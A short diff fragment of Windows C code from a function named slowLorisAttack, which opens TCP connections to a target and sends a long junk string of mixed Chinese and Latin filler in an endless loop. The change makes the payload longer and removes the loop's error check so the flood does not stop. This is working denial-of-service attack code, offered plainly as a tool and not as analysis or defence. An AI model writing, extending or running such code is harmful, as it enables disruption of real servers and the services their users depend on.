@@ -21,12 +21,12 @@ DWORD WINAPI slowLorisAttack(PVOID p)
 	{
 		unsigned long ul=1;
 		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); 
-		char kkk[]="举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu\r\n";
+		char kkk[]="举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCuduyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu\r\n";
 		if(s!=INVALID_SOCKET) 
 		{
 			connect(s,(sockaddr*)socket_address,sizeof(sockaddr_in));
 			int ret=ioctlsocket(s,FIONBIO,(unsigned long*)&ul);
-			while(1&&ret!=INVALID_SOCKET) 
+			while(1) 
 		 	{
 				int n=send(s,kkk,sizeof(kkk)-1,0); 
 				if(n==SOCKET_ERROR) 
